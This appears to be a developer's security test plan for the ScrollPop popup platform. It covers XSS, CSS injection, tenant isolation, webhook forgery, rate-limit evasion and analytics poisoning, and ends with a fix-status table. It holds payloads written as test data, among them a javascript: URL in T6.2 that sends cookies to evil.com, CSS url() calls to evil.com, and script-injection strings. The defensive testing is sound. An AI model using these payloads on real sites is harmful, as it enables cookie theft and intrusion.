# ScrollPop Security Test Scenarios

> **Purpose:** Adversarial test cases for manual and automated security testing.  
> **Audience:** Platform developer (solo). Run these before and after security hardening changes.  
> **Note:** All tests assume a local dev environment (`NODE_ENV=development`, localhost API). Never run destructive tests against production.

---

## Test Format

Each scenario includes:
- **Target:** What component/endpoint is being tested
- **Attack vector:** How the attack would be performed
- **Expected behavior:** What a hardened system should do
- **Current behavior:** What the system does today (based on code review)
- **Test command / steps:** How to reproduce

---

## Section 1 — XSS & Injection Tests

### T1.1 — `javascript:` URL in Affiliate Slot (CRITICAL — Known Vulnerable)

**Target:** Snippet popup rendering  
**Status:** VULNERABLE (see C1 in audit report)

**Steps:**
1. Create a campaign via the dashboard
2. Add an affiliate slot with `click_tracker_url = "javascript:alert(document.domain)"`
3. Activate the campaign
4. Load a test page with the snippet installed
5. Trigger the popup (scroll to 50%)

**Expected (hardened):** CTA button renders with `href="#"` (javascript: scheme blocked)  
**Current:** Alert fires; `javascript:` URL renders as-is through `escapeHtml()`

**Automated test (post-fix):**
```javascript
// In a vitest test for the snippet
import { escapeHtml, safeHref } from '../src/main';
test('safeHref blocks javascript: scheme', () => {
  expect(safeHref('javascript:alert(1)')).toBe('#');
  expect(safeHref('data:text/html,<script>alert(1)</script>')).toBe('#');
  expect(safeHref('https://example.com/link')).toBe('https://example.com/link');
  expect(safeHref('http://example.com')).toBe('http://example.com');
});
```

### T1.2 — HTML Injection in Design Config Text Fields

**Target:** Snippet headline/bodyText rendering  
**Steps:**
1. Create a campaign with `headline = '<img src=x onerror=alert(1)>'`
2. Activate and trigger the popup

**Expected:** `&lt;img src=x onerror=alert(1)&gt;` (escaped, displayed as text)  
**Current:** **PASS** — `escapeHtml(injectMacros(design.headline))` correctly escapes before DOM insertion

### T1.3 — CSS Injection via Background Image (HIGH — Known Vulnerable)

**Target:** Snippet style block  
**Steps:**
1. Set campaign `backgroundImage = "url(https://evil.com/exfil?c=abcde)"`
2. Activate and load the test page

**Expected (hardened):** URL validated as HTTPS and whitelisted before injection  
**Current:** URL injected directly into `background-image:url(...)` in the style tag — the external URL is fetched

**Test:** Open browser devtools Network tab. Confirm no request to `evil.com` when popup renders.

### T1.4 — CSS Value with Semicolon Escape Attempt

**Target:** Snippet style injection  
**Steps:**
1. Set campaign `backgroundColor = "#fff;background:url(https://evil.com)"`

**Expected (hardened):** Only hex color allowed; semicolons rejected  
**Current:** The string is injected into `.popup{...background:${design.backgroundColor}...}` — the injected semicolon creates a second CSS declaration; the `url()` loads

### T1.5 — Stored XSS via Analytics Dashboard Rendering

**Target:** Dashboard analytics pages rendering campaign/site names  
**Steps:**
1. Create a campaign named `<script>alert(document.cookie)</script>`
2. Navigate to the dashboard Analytics page

**Expected:** Campaign name displayed as escaped text  
**Current:** Requires testing in the dashboard React UI — React's JSX escapes by default, but any `dangerouslySetInnerHTML` usage would be vulnerable. Search codebase for `dangerouslySetInnerHTML` to confirm.

```bash
grep -r "dangerouslySetInnerHTML" apps/dashboard/src/
```

---

## Section 2 — Authentication & Authorization Tests

### T2.1 — Tenant Crossover via Direct Campaign ID

**Target:** Campaign route tenant isolation  
**Setup:** Create two test tenants (A and B) with separate campaigns

**Steps:**
1. Authenticate as Tenant A
2. Issue `GET /api/v1/campaigns/:campaign_id_of_tenant_B`

**Expected:** 404 or 403 (tenant B's campaign is not returned to tenant A)  
**Current:** **PASS** — Drizzle query includes `eq(campaigns.tenantId, request.tenantId)` in WHERE clause

**Automated test:**
```typescript
test('cannot read another tenant campaign', async () => {
  const res = await authedFetch(tenantA_token, `/api/v1/campaigns/${tenantB_campaign_id}`);
  expect(res.status).toBe(404);
});
```

### T2.2 — Tenant Crossover via `X-Tenant-Override` Without `INTERNAL_SECRET`

**Target:** Tenant context plugin  
**Steps:**
1. Send a normal Clerk JWT request with header `X-Tenant-Override: <victim-tenant-id>`

**Expected:** Header is ignored; requester's own tenant used  
**Current:** **PASS** — The `X-Tenant-Override` check is gated behind the `INTERNAL_SECRET` Bearer auth check; Clerk-authenticated users cannot use this header

### T2.3 — Dev-Mode Auth Bypass in Production

**Target:** `NODE_ENV` guard  
**Steps:**
1. Start the API with `NODE_ENV` unset (not set to `production`)
2. Send a request to any authenticated endpoint without an `Authorization` header

**Expected (hardened):** API panics at startup with "Set NODE_ENV=production"  
**Current:** Returns 200 with owner access to `org_demo_12345` — the demo tenant bypass activates

**Test:**
```bash
NODE_ENV= node apps/api/dist/index.js &
curl -X GET http://localhost:3001/api/v1/sites
# Should fail startup or return 401, currently returns 200
```

### T2.4 — `INTERNAL_SECRET` Bearer Auth Against Authenticated Route

**Target:** Tenant context bypass for admin tool  
**Steps:**
1. Obtain `INTERNAL_SECRET` value (from local `.env` file)
2. Send `Authorization: Bearer <INTERNAL_SECRET>` to `GET /api/v1/sites`
3. Optionally include `X-Tenant-Override: <any-tenant-uuid>`

**Expected:** Returns that tenant's sites  
**Current:** **WORKS AS DESIGNED** — this is the desktop admin tool's auth mechanism. The risk is the secret leaking; not the mechanism itself. Test confirms the bypass is functional.

### T2.5 — Admin Email Spoofing via Webhook

**Target:** User email in DB vs. Clerk source of truth  
**Steps:**
1. Sign up with email `attacker@example.com`
2. Manually update the `users` table: `UPDATE users SET email = 'dwain3991@gmail.com' WHERE clerk_user_id = 'user_attacker';`
3. Call `GET /api/v1/admin/tenants`

**Expected (hardened):** Admin check should verify against Clerk's authoritative user data, not the local DB copy  
**Current:** **PASS** — `assertSuperAdmin` reads from the local `users` table. However, that table is only writable by the API process itself (via Clerk webhooks) — direct DB access is required to exploit this. An attacker would need DB credentials to pull off this attack, at which point they have bigger problems.

**Assessment:** Low risk; document as accepted.

---

## Section 3 — Webhook Forgery Tests

### T3.1 — Forged Clerk Webhook

**Target:** `POST /api/v1/webhooks/clerk`  
**Steps:**
1. Send a POST to the webhook endpoint with a forged `user.created` payload
2. Omit or forge the `svix-signature` header

**Expected:** 400 with "Webhook signature verification failed"  
**Current:** **PASS** — Svix SDK verifies the signature; invalid signatures are rejected

**Test:**
```bash
curl -X POST https://localhost:3001/api/v1/webhooks/clerk \
  -H "Content-Type: application/json" \
  -H "svix-id: test_id" \
  -H "svix-timestamp: $(date +%s)" \
  -H "svix-signature: v1,forged_signature_here" \
  -d '{"type":"user.created","data":{"id":"forged_user"}}'
# Should return 400
```

### T3.2 — Forged Stripe Webhook

**Target:** `POST /api/v1/webhooks/stripe`  
**Steps:**
1. Send a `customer.subscription.updated` event with a forged plan
2. Include an invalid `Stripe-Signature` header

**Expected:** 400 signature validation failure  
**Current:** **PASS** — `stripe.webhooks.constructEvent()` validates the HMAC signature

### T3.3 — Replay Attack on Stripe Webhook

**Target:** Webhook timestamp freshness  
**Steps:**
1. Capture a valid Stripe webhook (signature + body)
2. Resend it 10 minutes later

**Expected:** Stripe's SDK rejects signatures older than 300 seconds by default  
**Current:** **PASS** — `stripe.webhooks.constructEvent()` includes a 5-minute tolerance window by default

---

## Section 4 — Rate Limit Evasion Tests

### T4.1 — Rate Limit Bypass via `X-Tenant-Id` Header Variation

**Target:** Global rate limiter at `apps/api/src/index.ts:88`  
**Steps:**
1. Script 201+ requests in one minute, each with a unique `X-Tenant-Id: <random-uuid>` header

**Expected (hardened):** Rate limit applies per IP regardless of header  
**Current:** **VULNERABLE** — Each unique `X-Tenant-Id` gets its own bucket; 200 requests/unique-value bypasses the limit

**Test:**
```bash
for i in $(seq 1 250); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "X-Tenant-Id: $(uuidgen)" \
    http://localhost:3001/health
done | sort | uniq -c
# With current code: all return 200
# After fix: requests >200 return 429
```

### T4.2 — Event Ingest Flood (50-event Batch Bypass)

**Target:** `POST /e` rate limit  
**Steps:**
1. Send requests with 50 events each (the maximum allowed per request) from a single IP
2. 500 requests/min ÷ 1 event = 500 beacons/min; but 500 events/batch × 10 batches/min = 5,000 events/min under the rate limit

**Expected:** Rate limit applies to requests, not events — this is a design tradeoff  
**Current:** **WORKS AS DESIGNED** — but worth documenting; a high-traffic site could generate significant DB load with batch-packed requests within the rate limit

**Assessment:** Acceptable for now. Add per-campaign event rate limit in v2 if needed.

---

## Section 5 — Analytics Poisoning Tests

### T5.1 — Spoofed `revenueCents` via Event Ingest

**Target:** `POST /e` field validation  
**Steps:**
1. Send a `conversion` event with `revenueCents: 999999999`

**Expected (hardened):** Value clamped to reasonable maximum or rejected  
**Current:** Stored verbatim; analytics dashboard would show $10M+ in revenue for a single conversion

**Test:**
```bash
curl -X POST http://localhost:3001/e \
  -H "Content-Type: application/json" \
  -d '{"events":[{"campaignId":"<valid-campaign-id>","eventType":"conversion","revenueCents":999999999}]}'
# Then query analytics to confirm the value was stored
```

### T5.2 — Arbitrary `pageUrl` in Events

**Target:** Analytics data quality + potential stored XSS in dashboard  
**Steps:**
1. Send events with `pageUrl: "https://competitor.com/landing"` and `pageUrl: "<script>alert(1)</script>"`

**Expected:** 
- Non-URL strings rejected
- Competitor URLs stored but displayed safely (React escapes by default)

**Current:** Stored verbatim. Dashboard display depends on React escaping.

### T5.3 — Visitor ID Inflation

**Target:** Unique visitor analytics  
**Steps:**
1. Send 1,000 events each with a unique `visitorId` string

**Expected (hardened):** Vistor IDs validated as UUID format  
**Current:** Arbitrary strings accepted and counted as unique visitors

---

## Section 6 — Embed & Script Injection Tests

### T6.1 — Public Key Enumeration

**Target:** `GET /c/:publicKey` (Worker config endpoint)  
**Steps:**
1. Issue requests with incrementing hex strings: `/c/aabb1122...`
2. Note 404 vs. 200 response code differences

**Expected:** Returns 404 for unknown keys — no timing difference that reveals valid keys  
**Current:** Returns 404 for unknown keys. No timing oracle — both DB paths return quickly.

**Assessment:** Low risk. Public keys are 32-char hex strings (16 bytes of entropy); enumeration is infeasible.

### T6.2 — Malicious Snippet Configuration via Compromised API

**Target:** Full attack chain  
**Scenario:** Attacker gains API access (e.g., via leaked `INTERNAL_SECRET`) and modifies a campaign's affiliate slot URLs to `javascript:` payloads

**Steps:**
1. POST to `/api/v1/campaigns/:id/design` with `affiliateSlots[0].click_tracker_url = "javascript:fetch('https://evil.com?'+document.cookie)"`
2. Activate the campaign
3. Any visitor to a site running the snippet clicks the popup CTA

**Expected (hardened):** `safeHref()` blocks the `javascript:` scheme in the snippet  
**Current:** VULNERABLE (see T1.1 above)

### T6.3 — CSP Bypass via Snippet on Host Site

**Target:** Snippet running on a host site with a strict CSP  
**Setup:** Configure a test page with CSP: `default-src 'self'; script-src 'self'`

**Steps:**
1. Install the ScrollPop snippet (loads from `cdn.scrollpop.online`)
2. Load the test page

**Expected:** CSP blocks the snippet if `cdn.scrollpop.online` is not in the script-src allowlist  
**Current:** **By design** — customers must add `cdn.scrollpop.online` and `edge.scrollpop.online` to their CSP. This is not documented anywhere in the current install guides.

**Action:** Add CSP configuration instructions to the install guides:
```
Content-Security-Policy: 
  script-src 'self' cdn.scrollpop.online;
  connect-src 'self' edge.scrollpop.online;
  img-src 'self' https:;
```

---

## Section 7 — Session & Auth Token Tests

### T7.1 — Clerk JWT Replay After Session Expiry

**Target:** API JWT validation  
**Steps:**
1. Capture a valid Clerk JWT
2. Wait for it to expire (Clerk default: 60 seconds)
3. Re-send the expired JWT to any authenticated endpoint

**Expected:** 401 "Authentication required"  
**Current:** **PASS** — Clerk's `getAuth()` validates token expiry

### T7.2 — JWT with Forged `orgId` Claim

**Target:** Tenant resolution in `tenant-context.ts`  
**Steps:**
1. Decode a valid JWT (the payload is base64; the signature is what you can't forge)
2. Modify the `orgId` claim to a different organization
3. Re-send with the modified payload (signature will be invalid)

**Expected:** 401 signature validation failure  
**Current:** **PASS** — Clerk's `getAuth()` verifies the JWT signature

### T7.3 — CSRF on State-Changing API Endpoints

**Target:** API routes (POST/PUT/PATCH/DELETE)  
**Steps:**
1. From a non-allowlisted origin, send a POST to `/api/v1/campaigns` with a valid Clerk JWT in the Authorization header

**Expected:** CORS blocks the preflight from untrusted origins  
**Current:** **PASS** — CORS allowlist restricts credentialed requests to `dashboard.scrollpop.online` and the Cloudflare Pages preview pattern

**Note:** The API uses Bearer token auth (header), not cookies. CSRF via cross-site form submission is not applicable since the browser cannot set the `Authorization` header cross-origin. CORS is defense-in-depth here.

---

## Section 8 — Shopify Integration Tests

### T8.1 — Shopify OAuth State Parameter CSRF

**Target:** `/api/v1/shopify/callback`  
**Steps:**
1. Initiate a Shopify OAuth flow for shop A
2. Intercept the redirect and swap the `state` parameter with one from a different OAuth flow

**Expected:** State parameter mismatch detected; request rejected  
**Current:** Requires code review of the state/nonce validation in `routes/shopify.ts`

**Test:**
```bash
# Start OAuth flow for shop-a.myshopify.com
# Capture the ?state=<nonce> from the callback URL
# Start OAuth flow for shop-b.myshopify.com
# Inject shop-a's state into shop-b's callback
# Verify the callback rejects the mismatched state
```

### T8.2 — Shopify Webhook HMAC With Empty Secret

**Target:** Shopify webhook HMAC validation  
**Steps:**
1. Remove `SHOPIFY_API_SECRET` from environment
2. Send a Shopify webhook POST

**Expected:** Request rejected (no secret = no validation)  
**Current:** Requires checking whether the HMAC validator handles a missing secret gracefully vs. silently accepting

---

## Summary: Known Vulnerable / Pass / Needs Testing

> Updated after Hardening Pass 1 + 2. All previously-vulnerable items are now FIXED.

| Test | Status | Notes |
|------|--------|-------|
| T1.1 — `javascript:` URL in affiliate link | ✅ FIXED | `safeHref()` at all 3 sites + server `safeUrl` schema |
| T1.2 — HTML injection in text fields | ✅ PASS | `escapeHtml` everywhere |
| T1.3 — CSS injection via backgroundImage | ✅ FIXED | `safeCssUrl()` |
| T1.4 — CSS semicolon injection | ✅ FIXED | `safeCssColor`/`cssLen`/`cssNum` whitelist all CSS sinks |
| T1.5 — Stored XSS in analytics dashboard | ✅ PASS | verified no `dangerouslySetInnerHTML`; React escapes |
| T1.6 — **Stored XSS via element `fontFamily`/style fields** (Pass 2) | ✅ FIXED | `cssFont`/`cssAlign`/`cssWeight`/`cssNum`/`cssLen` + 21 unit tests |
| T2.1 — Cross-tenant campaign read | ✅ PASS | tenant filter in every query |
| T2.2 — `X-Tenant-Override` without secret | ✅ PASS | gated behind `INTERNAL_SECRET` + now audit-logged |
| T2.3 — Dev-mode bypass without NODE_ENV | ✅ FIXED | panics if DB is non-local |
| T2.4 — `INTERNAL_SECRET` bypass | By design | now audit-logged on use |
| T2.5 — Admin email spoofing via DB | ✅ FIXED | super-admin requires verified Clerk primary email |
| T2.6 — **Unverified `@novatise.com` → agency plan** (Pass 2) | ✅ FIXED | `isVerifiedPrimaryEmail()` gate |
| T3.1 — Forged Clerk webhook | ✅ PASS | Svix verified |
| T3.2 — Forged Stripe webhook | ✅ PASS | `constructEvent` |
| T3.3 — Stripe webhook replay | ✅ PASS | 5-min tolerance |
| T4.1 — Rate limit bypass via header variation | ✅ FIXED | keyed on real IP only |
| T4.2 — Event batch-size abuse | ✅ MITIGATED | per-campaign-per-IP impression gate |
| T5.1 — Spoofed `revenueCents` | ✅ FIXED | clamped 0–1,000,000 |
| T5.2 — Arbitrary `pageUrl` in events | ✅ FIXED | URL-validated |
| T5.3 — Visitor ID inflation | ✅ FIXED | UUID-format validated |
| T5.4 — **Quota-exhaustion DoS via forged impressions** (Pass 2) | ✅ FIXED | per-IP impression gate (won't count/store floods) |
| T6.1 — Public key enumeration | ✅ PASS | 16-byte entropy, infeasible |
| T6.2 — Compromised API → snippet XSS | ✅ FIXED | snippet sanitizers defend at the render sink |
| T6.3 — CSP instructions missing | ✅ FIXED | dashboard `_headers` CSP (report-only) + host CSP guidance |
| T6.4 — **Supply-chain: tampered/stale edge bundle** (Pass 2) | ✅ FIXED | CI byte-equality gate on `p.txt` |
| T7.1 — Expired JWT replay | ✅ PASS | Clerk validates expiry |
| T7.2 — Forged JWT orgId | ✅ PASS | Clerk validates signature |
| T7.3 — CSRF on state-changing routes | ✅ PASS | Bearer-token auth, CORS allowlist |
| T8.1 — Shopify OAuth CSRF | ✅ PASS | HMAC + nonce + state + 5-min timestamp |
| T8.2 — Shopify webhook HMAC | ✅ PASS | `timingSafeEqual` |
| T9.1 — WP plugin key injection | ✅ PASS | strict 32-hex + `esc_js`/`esc_attr` |
| T9.2 — Shopify Liquid key injection | ✅ PASS | `| escape` neutralizes breakout chars |
